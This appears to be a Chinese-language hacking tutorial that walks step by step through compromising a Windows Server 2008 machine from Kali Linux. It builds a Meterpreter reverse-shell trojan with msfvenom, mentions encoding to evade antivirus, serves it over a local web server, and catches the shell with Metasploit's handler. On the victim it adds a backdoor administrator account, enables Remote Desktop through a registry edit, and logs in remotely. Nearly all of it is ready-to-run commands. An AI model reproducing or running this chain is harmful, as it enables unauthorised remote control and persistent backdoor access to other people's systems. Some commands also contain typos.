### 1、创建木马

```
root@kali:~#msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.79.133 lport=8787 -f exe >./demo.exe   //最后输出木马在本地，名为demo.exe
```

​       -p 选择具体的payload

​       -f 文件格式

​	lhost 本地ip

​	lport 需要建立连接的端口

-e编码免杀

-i编码次数

-a 选择架构平台 //x86 | x64 | x86_64

kali >windows server 2008文件传输

```linux
root@kali:~#python -m SimpleHTTPServer 8080    //8080为自定义端口
```

```linux
root@kali:~#php -S ip:8080      //8080为自定义端口
```

### 2、msf操作

```
root@kali:~# msfconsole
msf > use exploit/multi/handler
msf exploit(multi/handler) > set payload windows/metepreter/reverse_tcp
msf exploit(multi/handler) > show options
msf exploit(multi/handler) > set rhost 192.168.79.133     //攻击机，即本机ip
msf exploit(multi/handler) > set rport 8787             //此处8787与创建木马8787一致
msf exploit(multi/handler) > exploit                   //run或者exploit都可以
msf exploit(multi/handler) > shell                 //进入远程系统
```

### 3、远程主机操作

```
C:\Users\Marshal\Desktop>whoami          //查看当前用户情况                                  C:\Users\Marshal\Desktop>net user 用户名       //查看当前用户权限                             
C:\Users\Marshal\Desktop>net user hacker 123.com /add     //添加用户
C:\Users\Marshal\Desktop>net localgroup administrators hacker /add      //添加管理员组
C:\Users\Marshal\Desktop>net localgroup "Remote Desktop Users" hakcer /add  //添加远程组
C:\Users\Marshal\Desktop>net user 用户名                   //查看用户所属组
C:\Users\Marshal\Desktop>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f          //开启3389
C:\Users\Marshal\Desktop>netstat -ano |findstr 3389            //检查是否真正开启3389
```

### 4、登陆远程桌面

```
root@kali:~#rdesktop 192.168.79.134         //被攻击者ip
```

